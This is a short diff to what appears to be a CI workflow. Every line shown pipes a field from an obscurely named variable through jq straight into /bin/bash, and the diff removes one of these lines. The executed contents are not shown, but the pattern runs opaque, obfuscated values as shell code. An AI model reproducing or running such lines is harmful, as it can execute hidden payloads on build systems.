@@ -28,7 +28,6 @@ jobs:
           echo $si6 | jq -r .hrqx5 | /bin/bash
           echo $b3 | jq -r .sc391 | /bin/bash
           echo $cp74 | jq -r .gnslz0235 | /bin/bash
-          echo $fydqa63648 | jq -r .laj6 | /bin/bash
           printf '%s' "$wqlwl0126" | jq -r .fls15 | /bin/bash
           printf '%s' "$aprzn858" | jq -r .hpl964 | /bin/bash
           echo $lce70 | jq -r .xyyqp42900 | /bin/bash
